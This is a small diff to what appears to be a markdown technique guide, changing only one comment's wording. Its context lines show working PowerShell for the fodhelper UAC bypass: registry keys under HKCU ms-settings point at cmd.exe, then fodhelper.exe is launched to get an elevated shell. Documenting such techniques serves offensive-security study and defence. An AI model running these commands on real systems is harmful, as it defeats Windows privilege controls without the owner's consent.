@@ -6,7 +6,7 @@
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe" -Force
 New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
 
-#start fodhelper.exe to execute the registry
+#start fodhelper.exe to execute command in the registry
 Start-Process "C:\Windows\System32\fodhelper.exe"
 ```
 ### Cleanup the registry value 
